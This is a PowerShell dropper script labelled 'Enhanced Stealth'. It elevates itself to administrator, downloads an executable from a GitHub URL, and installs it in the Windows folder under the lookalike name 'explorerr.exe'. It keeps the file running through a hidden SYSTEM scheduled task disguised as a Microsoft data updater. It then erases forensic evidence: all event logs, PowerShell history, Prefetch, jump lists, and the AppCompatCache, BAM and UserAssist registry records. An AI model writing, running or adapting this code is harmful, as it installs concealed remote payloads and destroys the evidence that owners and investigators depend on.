# Menu Selection
Write-Host "+ Utility Runner (Enhanced Stealth)"
Write-Host "1. Install & Run"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Restarting with elevated privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
    exit
}

$InstallPath = $env:windir
$SexeDestination = Join-Path $InstallPath "explorerr.exe" 
$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
$TaskName = "\Microsoft\Windows\SystemDataUpdater"

function Write-SimulationProgress {
    param(
        [string]$Message,
        [int]$Duration = 3
    )
    Write-Host "$Message " -NoNewline -ForegroundColor Cyan
    for ($i = 0; $i -lt $Duration; $i++) {
        Write-Host "." -NoNewline -ForegroundColor Green
        Start-Sleep -Milliseconds 500
    }
    Write-Host ""
}

function Set-Persistence {
    param(
        [Parameter(Mandatory=$true)]
        [string]$PathToExe
    )
    Write-Host "Starting system service registration..." -ForegroundColor Cyan
    
    $Action = New-ScheduledTaskAction -Execute $PathToExe
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden

    Write-SimulationProgress -Message "Processing service request" -Duration 4
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Performs critical system data synchronization." -Force | Out-Null
    
    Write-Host "Service registration complete." -ForegroundColor Green
}

function Remove-Persistence {
    param(
        [Parameter(Mandatory=$true)]
        [string]$TaskPath
    )
    Write-Host "Removing system service..."
    if (Get-ScheduledTask -TaskName $TaskPath -ErrorAction SilentlyContinue) {
        Write-SimulationProgress -Message "Unregistering task" -Duration 4
        Unregister-ScheduledTask -TaskName $TaskPath -Confirm:$false
        Write-Host "Task $TaskPath removed." -ForegroundColor Green
    } else {
        Write-Host "Task $TaskPath not found." -ForegroundColor Yellow
    }
}

function Clear-Traces {
    Write-Host "Initiating system cleanup routines..." -ForegroundColor Yellow
    
    Write-SimulationProgress -Message "Running essential maintenance" -Duration 7
    
    try {
        $PSHistoryPath = (Get-PSReadLineOption).HistorySavePath
        Remove-Item $PSHistoryPath -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $AutomaticDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"
        $CustomDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $AutomaticDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
        Get-ChildItem -Path $CustomDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
    } catch {}

    try {
        $PrefetchPath = Join-Path $env:windir "Prefetch"
        Get-ChildItem -Path $PrefetchPath -Exclude "Layout.ini" -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
    } catch {}

    try {
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, (Get-ItemProperty -Path $RunKey).'(default)', MRUList | ForEach-Object {
            Remove-ItemProperty -Path $RunKey -Name $_.PSProperty.Name -ErrorAction SilentlyContinue
        }
    } catch {}

    Write-Host "  -> Clearing system logs..."
    try {
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
            Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue
        }
    } catch {}
    
    Write-Host "  -> Running deep registry cleanup..."
    try {
        $ShimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
        Remove-ItemProperty -Path $ShimKey -Name "AppCompatCache" -ErrorAction SilentlyContinue
    } catch {}

    try {
        $BAMKey = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
        Remove-Item -Path $BAMKey -Recurse -Force -ErrorAction SilentlyContinue
        $UserAssistKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        Remove-Item -Path $UserAssistKey -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "System maintenance complete." -ForegroundColor Green
}

if ($choice -eq "1") {
    Write-Host "`nStarting operations..."
    
    Write-Host "Retrieving and preparing executable..."
    try {
        Write-SimulationProgress -Message "Downloading file" -Duration 8 
        $tempfile = Join-Path $env:TEMP "temp_download.exe"
        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile

        Write-Host "Moving file to system location: $SexeDestination" -ForegroundColor Yellow
        Move-Item -Path $tempfile -Destination $SexeDestination -Force
        
        Write-Host "Executable installation complete." -ForegroundColor Green
    } catch {
        Write-Host "Installation failed: $_" -ForegroundColor Red
        exit
    }

    Set-Persistence -PathToExe $SexeDestination

    Write-Host "Executing core application..."
    try {
        Write-SimulationProgress -Message "Executing explorerr.exe" -Duration 3
        Start-Process -FilePath $SexeDestination
        Write-Host "Program started." -ForegroundColor Green
    } catch {
        Write-Host "Execution failed: $." -ForegroundColor Red
    }
    
    Clear-Traces

    Write-Host "`nInstallation completed successfully." -ForegroundColor Green

} elseif ($choice -eq "2") {
    Write-Host "Initiating system cleanup..."

    Remove-Persistence -TaskPath $TaskName

    Write-Host "Stopping core application process..."
    try {
        Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
        Stop-Process -Name "explorerr" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2 
        Write-Host "Process stop signal sent." -ForegroundColor Yellow
    } catch {
        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
    }

    Write-Host "Attempting to remove installed file..."
    if (Test-Path $SexeDestination) {
        try {
            Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
            Remove-Item $SexeDestination -Force
            Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
        } catch {
            Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
        }
    }
    
    Write-Host "Cleanup completed." -ForegroundColor Green

} else {
    Write-Host "Invalid choice." -ForegroundColor Red
}
